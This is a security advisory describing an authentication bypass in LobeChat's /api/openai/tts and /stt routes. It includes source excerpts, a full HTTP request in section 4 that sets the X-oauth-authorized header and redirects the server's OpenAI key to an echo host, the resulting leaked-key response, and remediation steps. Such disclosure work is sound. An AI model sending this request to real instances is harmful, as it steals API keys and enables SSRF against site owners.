# LobeChat: Unauthenticated Disclosure of the Server-Side OPENAI_API_KEY via `X-oauth-authorized` Auth Bypass

## 1. Submission Details

| Item                | Value                                                        |
| ------------------- | ------------------------------------------------------------ |
| Product             | LobeChat (LobeHub, npm `@lobehub/chat`)                      |
| Affected version    | 1.11.9 (source audit + reproduction); other versions not individually verified |
| Affected endpoint   | `POST /api/openai/tts` (`/api/openai/stt` shares the same root cause) |
| Vulnerability class | CWE-306 Missing Authentication for Critical Function (root cause) / CWE-200 Exposure of Sensitive Information (impact) / CWE-918 SSRF (co-existing impact) |
| Preconditions       | Self-hosted instance with a server-side `OPENAI_API_KEY` configured; **no account, no login, no knowledge of `ACCESS_CODE` required** |
| CVSS 3.1            | `8.6` `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N` (`7.5` if scored for key disclosure alone) |
| Test environment    | Node 20.20.2 / Next.js 14.2.35 / `@lobehub/tts` 1.29.0       |
| Verified on         | 2026-11-18                                                   |

## 2. Product Overview

LobeChat is an open-source, self-hosted AI chat framework (Next.js 14 App Router) with an official one-click Docker deployment, widely used for private on-premise deployments. Access is controlled server-side via `ACCESS_CODE`, NextAuth, or Clerk, and a server-side `OPENAI_API_KEY` is commonly configured so that users without their own key can still call models.

## 3. Vulnerability Description

The `checkAuth` used by the TTS/STT routes treats the `X-oauth-authorized` request header as the sole authentication factor. Unlike the chat route, it does not additionally require `enableNextAuth` (i.e., a real NextAuth session).

`src/app/api/openai/createBizOpenAI/auth.ts:10`

```ts
export const checkAuth = ({ apiKey, accessCode, oauthAuthorized }: AuthConfig) => {
  if (oauthAuthorized) return { auth: true };   // ← header only, no session validation
  ...
```

The header is mapped to a boolean with no origin or signature validation (`src/const/fetch.ts:10,21-23`):

```ts
export const OAUTH_AUTHORIZED = 'X-oauth-authorized';
const oauthAuthorized = !!req.headers.get(OAUTH_AUTHORIZED);
```

The outbound base URL comes from a request header, and the server-side key is used whenever the client supplies no key (`src/app/api/openai/createBizOpenAI/createOpenai.ts:10-12`):

```ts
const baseURL = endpoint ? endpoint : OPENAI_PROXY_URL ? OPENAI_PROXY_URL : undefined;
const apiKey = !userApiKey ? OPENAI_API_KEY : userApiKey;
return new OpenAI({ apiKey, baseURL });   // baseURL comes from X-openai-end-point
```

For comparison, the chat route implements this correctly (`src/app/api/middleware/auth/utils.ts:69`):

```ts
if (enableNextAuth && nextAuthAuthorized) return;   // both conditions required
```

Exploitability by deployment mode:

| Deployment mode                            | Exploitable unauthenticated        | Notes                                                        |
| ------------------------------------------ | ---------------------------------- | ------------------------------------------------------------ |
| Default self-host (only `ACCESS_CODE` set) | Yes (reproduced)                   | No middleware rewrites the header; it passes through         |
| Clerk enabled                              | Yes (based on code path)           | `clerkMiddleware` does not delete the header and the route does not validate the Clerk session |
| NextAuth enabled                           | Requires any authenticated session | `nextAuthMiddleware` deletes the header for unauthenticated requests (`src/middleware.ts:37-38`) |

## 4. Reproduction (Leak the Key with a Single Request)

Without the `X-oauth-authorized` header the endpoint returns `401 {"errorType":"InvalidAccessCode"}`; with the header, authentication is bypassed.

Point `X-openai-end-point` at any echo-capable service (the public echo service `https://httpbingo.org/anything`, a self-hosted receiver, or `webhook.site`) and send:

```http
POST /api/openai/tts HTTP/1.1
Host: TARGET
User-Agent: Mozilla/5.0
Accept: */*
Content-Type: application/json
X-oauth-authorized: true
X-openai-end-point: https://httpbingo.org/anything
Content-Length: 61
Connection: close

{"input":"hello","options":{"model":"tts-1","voice":"alloy"}}
```

The server then issues:

```http
POST /audio/speech
Authorization: Bearer <server-side OPENAI_API_KEY>   ← server key is exfiltrated with the request
Body: {"input":"hello","model":"tts-1","voice":"alloy"}
```

The echo service reflects the received headers, so the key is readable directly from the HTTP response:

```http
HTTP/1.1 200 OK

{
  "headers": {
    "Authorization": ["Bearer <server-side OPENAI_API_KEY>"],
    ...
  },
  "url": "https://httpbingo.org/anything/audio/speech"
}
```

The key has genuinely left the server host and reached an attacker-controlled address. `POST /api/openai/stt` reuses the same `createBizOpenAI` (multipart body: `file`, `model=whisper-1`) and leaks the key the same way.

<img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/28c823d1-a25e-41ae-a94d-89267c997c89" />

<img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/09e942d0-aea2-4d5c-81e9-47acb37b7b95" />


## 5. Impact

1. **The server-side `OPENAI_API_KEY` is disclosed to any internet user**, directly causing third-party API billing loss; if the key is reused across an organization, the impact extends to other systems.
2. **SSRF**: the server issues `POST /audio/speech|transcriptions` to any `X-openai-end-point` with an attacker-controlled body, enabling probing/access of internal HTTP services.
3. **Access control bypass**: zero-credential bypass on deployments with `ACCESS_CODE` enabled; instances without `ACCESS_CODE` require no precondition at all.

## 6. Remediation

1. Tie `oauthAuthorized` to `enableNextAuth` and a server-side session; never authorize on a bare request header boolean.
2. When a user supplies a custom endpoint, only allow the user's own key; never send the server-side `OPENAI_API_KEY` to a user-controlled base URL.
3. Allowlist `X-openai-end-point` (scheme + host + resolved IP); reject private, loopback, link-local addresses and redirects.
4. Unify the authentication implementation between the chat and TTS/STT routes.

## 7. References

- CWE-306 / CWE-200 / CWE-918
- LobeChat source: <https://github.com/lobehub/lobe-chat> (`src/app/api/openai/createBizOpenAI/`, `src/const/fetch.ts`, `src/middleware.ts`)
- Precedent: CVE-2024-32965 (`X-Lobe-Chat-Auth` token tampering leading to SSRF, fixed in 1.19.13)

---

> Notes before submission:
>
> 1. As of 2026-11-18 no corresponding entry for this endpoint was found in NVD or GitHub Advisory; **whether upstream `main` still contains this implementation could not be verified online**, so please confirm against the `main` branch that the flaw still exists in a supported version before submitting.
> 2. `TARGET`, attacker addresses, and the real key are placeholders throughout; redact the real key in any screenshots used in the submission.
